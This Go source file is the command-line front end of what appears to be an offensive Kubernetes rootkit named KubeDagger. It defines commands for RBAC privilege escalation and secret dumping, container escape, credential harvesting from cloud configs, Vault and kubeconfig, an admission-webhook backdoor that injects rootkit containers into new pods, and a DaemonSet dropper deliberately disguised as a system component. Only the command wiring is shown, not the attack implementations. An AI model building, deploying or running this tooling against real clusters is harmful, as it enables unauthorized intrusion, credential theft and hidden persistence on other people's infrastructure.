package run

import (
	"fmt"

	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/daemonset"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/escape"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s_abuse"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/secrets"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/sidecar_inject"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/webhook"
)

var cmdK8sDiscover = &cobra.Command{
	Use:   "discover",
	Short: "discover cluster resources",
	Long:  "discover enumerates pods, services, nodes and identifies privileged targets",
	RunE:  k8sDiscoverCmd,
}

var cmdK8sAbuse = &cobra.Command{
	Use:   "abuse",
	Short: "K8s privilege escalation",
	Long:  "abuse enumerates RBAC permissions and identifies privilege escalation paths",
	RunE:  k8sAbuseCmd,
}

var cmdEscape = &cobra.Command{
	Use:   "escape",
	Short: "container escape",
	Long:  "escape detects and executes container escape techniques",
	RunE:  escapeCmd,
}

var cmdSecretsHarvest = &cobra.Command{
	Use:   "harvest",
	Short: "harvest secrets from all sources",
	Long:  "harvest collects credentials from environment variables, K8s mounts, cloud CLI configs, Docker, Vault, and kubeconfig",
	RunE:  secretsHarvestCmd,
}

var cmdWebhook = &cobra.Command{
	Use:   "webhook",
	Short: "admission webhook backdoor",
	Long:  "webhook deploys a mutating admission webhook that injects rootkit init containers into new pods",
	RunE:  webhookCmd,
}

var cmdDaemonSet = &cobra.Command{
	Use:   "daemonset",
	Short: "DaemonSet dropper",
	Long:  "daemonset self-replicates the rootkit across all cluster nodes via a privileged DaemonSet",
	RunE:  daemonSetCmd,
}

var cmdSidecarInject = &cobra.Command{
	Use:   "sidecar-inject",
	Short: "Sidecar container injection",
	Long:  "sidecar-inject uses kubelet CRI API to inject containers directly into running pods",
	RunE:  sidecarInjectCmd,
}

func k8sDiscoverCmd(cmd *cobra.Command, args []string) error {
	return k8s.Discover(options.K8sNamespace, options.Output)
}

func k8sAbuseCmd(cmd *cobra.Command, args []string) error {
	return k8s_abuse.Execute(options.K8sAction, options.K8sToken, options.K8sNamespace, options.Output)
}

func escapeCmd(cmd *cobra.Command, args []string) error {
	return escape.Execute(options.EscapeAction, options.EscapeTechnique, options.Output)
}

func secretsHarvestCmd(cmd *cobra.Command, args []string) error {
	return secrets.Harvest(options.SecretSources, options.Output)
}

func webhookCmd(cmd *cobra.Command, args []string) error {
	switch options.WebhookAction {
	case "deploy":
		return webhook.Deploy(options.WebhookNamespace, options.WebhookImage, options.Output)
	case "remove":
		return webhook.Remove(options.WebhookNamespace, options.Output)
	default:
		return fmt.Errorf("unsupported webhook action: %s (use 'deploy' or 'remove')", options.WebhookAction)
	}
}

func daemonSetCmd(cmd *cobra.Command, args []string) error {
	switch options.DaemonSetAction {
	case "deploy":
		return daemonset.Deploy(options.K8sNamespace, options.DaemonSetImage, options.DaemonSetName, options.Output)
	case "remove":
		return daemonset.Remove(options.K8sNamespace, options.DaemonSetName, options.Output)
	case "status":
		return daemonset.Status(options.K8sNamespace, options.DaemonSetName, options.Output)
	default:
		return fmt.Errorf("unsupported daemonset action: %s (use 'deploy', 'remove', or 'status')", options.DaemonSetAction)
	}
}

func sidecarInjectCmd(cmd *cobra.Command, args []string) error {
	return sidecar_inject.Execute(options.Target, options.SidecarPod, options.SidecarImage, options.SidecarNamespace, options.Output)
}

func init() {
	cmdK8sDiscover.PersistentFlags().StringVar(
		&options.K8sNamespace,
		"namespace",
		"all",
		"namespace to discover (or 'all' for all namespaces)")
	cmdK8sAbuse.PersistentFlags().StringVar(
		&options.K8sAction,
		"action",
		"enum",
		"abuse action: enum, escalate, or dump-secrets")
	cmdK8sAbuse.PersistentFlags().StringVar(
		&options.K8sToken,
		"token",
		"",
		"service account token (auto-detected if not specified)")
	cmdK8sAbuse.PersistentFlags().StringVar(
		&options.K8sNamespace,
		"namespace",
		"default",
		"target namespace for abuse operations")
	cmdK8sDiscover.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	cmdK8sAbuse.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")

	cmdK8s.AddCommand(cmdK8sDiscover)
	cmdK8s.AddCommand(cmdK8sAbuse)
	KUBEDaggerClient.AddCommand(cmdK8s)

	cmdEscape.PersistentFlags().StringVar(
		&options.EscapeAction,
		"action",
		"detect",
		"escape action: detect or execute")
	cmdEscape.PersistentFlags().StringVar(
		&options.EscapeTechnique,
		"technique",
		"all",
		"escape technique: privileged, hostpath, hostpid, hostnet, or all")
	cmdEscape.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdEscape)

	cmdSecretsHarvest.PersistentFlags().StringVar(
		&options.SecretSources,
		"sources",
		"all",
		"secret sources: env, k8s, cloud, docker, vault, kubeconfig, or all")
	cmdSecretsHarvest.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	cmdSecrets.AddCommand(cmdSecretsHarvest)
	KUBEDaggerClient.AddCommand(cmdSecrets)

	cmdWebhook.PersistentFlags().StringVar(
		&options.WebhookAction,
		"action",
		"deploy",
		"webhook action: deploy or remove")
	cmdWebhook.PersistentFlags().StringVar(
		&options.WebhookNamespace,
		"namespace",
		"kube-system",
		"namespace for webhook deployment")
	cmdWebhook.PersistentFlags().StringVar(
		&options.WebhookImage,
		"image",
		"",
		"webhook handler image")
	cmdWebhook.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdWebhook)

	cmdDaemonSet.PersistentFlags().StringVar(
		&options.DaemonSetAction,
		"action",
		"deploy",
		"daemonset action: deploy, remove, or status")
	cmdDaemonSet.PersistentFlags().StringVar(
		&options.DaemonSetImage,
		"image",
		"",
		"rootkit container image for daemonset pods")
	cmdDaemonSet.PersistentFlags().StringVar(
		&options.DaemonSetName,
		"name",
		"kube-node-monitor",
		"daemonset name (disguised as system component)")
	cmdDaemonSet.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdDaemonSet)

	cmdSidecarInject.PersistentFlags().StringVar(
		&options.SidecarPod,
		"pod",
		"",
		"target pod to inject sidecar into")
	cmdSidecarInject.PersistentFlags().StringVar(
		&options.SidecarImage,
		"image",
		"",
		"sidecar container image")
	cmdSidecarInject.PersistentFlags().StringVar(
		&options.SidecarNamespace,
		"namespace",
		"default",
		"target pod namespace")
	cmdSidecarInject.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdSidecarInject)
}
